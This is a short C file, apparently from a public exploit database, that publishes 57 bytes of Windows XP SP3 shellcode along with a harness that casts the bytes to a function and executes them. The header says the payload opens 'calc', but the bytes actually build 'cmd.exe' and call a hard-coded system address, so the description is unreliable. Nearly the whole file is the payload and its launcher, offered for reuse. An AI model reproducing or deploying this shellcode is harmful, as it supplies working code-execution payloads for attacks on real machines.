/*

[+] win32/xp pro sp3 (calc) 57 bytes


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1                    ######################################            1
0                    I'm cr4wl3r  member from Inj3ct0r Team            1
1                    ######################################            0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1



[+]Discovered By: cr4wl3r
 */

#include <stdio.h>
#include <string.h>


int main() {
char shell[] = 	"\xb8\xff\xef\xff\xff\xf7\xd0\x2b\xe0\x55\x8b\xec"
		"\x33\xff\x57\x83\xec\x04\xc6\x45\xf8\x63\xc6\x45"
		"\xf9\x6d\xc6\x45\xfa\x64\xc6\x45\xfb\x2e\xc6\x45"
		"\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45"
		"\xf8\x50\xbb\xc7\x93\xbf\x77\xff\xd3";

printf("Shellcode lenght %d\n", strlen(shell));
getchar();
((void (*)()) shell)();
return 0;
}